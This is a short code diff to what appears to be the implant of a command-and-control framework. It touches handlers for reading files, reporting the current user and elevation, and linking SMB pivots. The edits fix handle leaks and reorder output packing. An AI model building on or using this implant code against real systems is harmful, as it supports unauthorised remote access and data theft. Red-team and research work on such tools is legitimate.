@@ -153,14 +153,9 @@ void Commander::CmdCat(ULONG commandId, Packer* inPacker, Packer* outPacker)
 	outPacker->Pack32(taskId);
 
 	HANDLE hFile = ApiWin->CreateFileA(path, GENERIC_READ, 0, 0, OPEN_EXISTING, 0, 0);
-	if ((!hFile) || (hFile == INVALID_HANDLE_VALUE)) {
+	if ( !hFile || hFile == INVALID_HANDLE_VALUE ) {
 		outPacker->Pack32(COMMAND_ERROR);
 		outPacker->Pack32(TEB->LastErrorValue);
-
-		if (hFile) {
-			ApiNt->NtClose(hFile);
-			hFile = NULL;
-		}
 		return;
 	}
 
@@ -348,7 +343,6 @@ void Commander::CmdGetUid(ULONG commandId, Packer* inPacker, Packer* outPacker)
 	ULONG taskId = inPacker->Unpack32();
 
 	outPacker->Pack32(taskId);
-	outPacker->Pack32(commandId);
 
 	BOOL  result       = FALSE;
 	BOOL  elevated     = FALSE;
@@ -362,6 +356,7 @@ void Commander::CmdGetUid(ULONG commandId, Packer* inPacker, Packer* outPacker)
 		result = TokenToUser(TokenHandle, username, &usernameSize, domain, &domainSize, &elevated);
 
 	if (result) {
+		outPacker->Pack32(commandId);
 		outPacker->Pack8(elevated);
 		outPacker->PackStringA(domain);
 		outPacker->PackStringA(username);
@@ -370,6 +365,9 @@ void Commander::CmdGetUid(ULONG commandId, Packer* inPacker, Packer* outPacker)
 		outPacker->Pack32(COMMAND_ERROR);
 		outPacker->Pack32(TEB->LastErrorValue);
 	}
+
+	if (TokenHandle)
+		ApiNt->NtClose(TokenHandle);
 
 	MemFreeLocal( (LPVOID*)&username, 512);
 	MemFreeLocal( (LPVOID*)&domain, 512);
@@ -422,9 +420,6 @@ void Commander::CmdJobsKill(ULONG commandId, Packer* inPacker, Packer* outPacker
 void Commander::CmdLink(ULONG commandId, Packer* inPacker, Packer* outPacker)
 {
 	ULONG pivotType = inPacker->Unpack32();
-
-	DWORD BytesSize = 0;
-	PVOID Output = NULL;
 
 	if (pivotType == PIVOT_TYPE_SMB) {
 		ULONG pipeSize = 0;
